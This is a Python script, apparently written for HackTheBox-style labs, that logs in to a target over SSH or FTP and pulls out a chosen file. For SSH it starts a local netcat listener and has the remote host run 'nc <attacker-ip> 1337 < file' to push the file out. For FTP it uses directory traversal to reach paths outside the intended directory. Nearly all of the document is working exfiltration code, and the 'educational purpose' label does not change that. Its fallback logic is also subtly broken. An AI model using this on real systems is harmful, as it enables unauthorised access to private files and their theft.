'''
it is a script that suppose to run in a Linux System. otherwise, 
you can try it in windows and see yourself how fucked up this script is for windows.
'''
import pexpect
import argparse
import re
import ntpath
import os
parser = argparse.ArgumentParser(description="only for educational purpose!\n Our program use 1337 port. so, please make sure that you must not have any other service running on this port.")
parser.add_argument("-P","--protocol",help="choose SSH or FTP", type=str, required=True)
parser.add_argument("-u", "--username", help="username on the choosen port", required=True)
parser.add_argument("-p", "--password", help="For password", required=True)
parser.add_argument("-i", "--serverip", help="for IP or domain", required=False)
parser.add_argument("-I", "--myip", help="your IP on which you will recive file", required=True)
parser.add_argument("-f","--filename", help="the file path you want to download from SSH/FTP", type=str)
args = parser.parse_args()


username = args.username
Pass = args.password
server_ip = args.serverip
wants_to_download_file = args.filename
d_file = ntpath.basename(wants_to_download_file)



def ssh_connector():
    first_expect = f"{username}@{server_ip}'s password:"
    child = pexpect.spawn(f"ssh {username}@{server_ip}")
    child.expect(first_expect)
    child.sendline(Pass)
    i = child.expect([f"{username}", "Permission denied, please try again."])
    if i == 0:
        try:
            child.sendline(f"nc {args.myip} 1337 < {wants_to_download_file} ")
        except:
            print("nc command didnn't work. trying netcat...\n")
            child.sendline(f"netcat {args.myip} 1337 < {wants_to_download_file}")  
        else:
            print("trying the last option!\n")
            os.system(f"scp {username}@{server_ip}:{wants_to_download_file} /root/Desktop/")
            print("You should have the file on your desktop")
    elif i == 1:
        print("Given info. was not correct!")
        child.kill(0)
        exit(0)

def ftp_connector():
    child = pexpect.spawn("ftp")
    child.expect("ftp>")
    child.sendline(f"open {server_ip}") # for testing HTB fatty FTP: 10.10.10.174
    i = child.expect(["220", "refused"])
    if i == 0:
        print("[+] server is ONLINE")
        child.sendline(username)
        child.expect("Password")
        child.sendline(Pass)
        j = child.expect(["230","530"])
        if j == 0:    
            print("You have logged in successfully")
            child.sendline(f"cd ../../../../../../../../../../../../..{os.path.dirname(wants_to_download_file)}")
            child.expect("250")
            child.sendline(f"get {d_file}")
            child.expect("ftp>")
            child.sendline("bye")
        elif j == 1:
            print("creds are incorrect!")
            exit(0)
    elif i == 1:
        print("You are doing something wrong!\n")
        exit(0)



if args.protocol == "ssh":
    print("Ok, we will try to download file with different options!")
    os.system(f"nc -lvp 1337 >{d_file} &")
    ssh_connector()

elif args.protocol == "ftp":
    print(f"You want to grab {d_file} file with FTP!")
    ftp_connector()
else:
    print("Wrong protocol\n Choose from [ftp/ssh]")

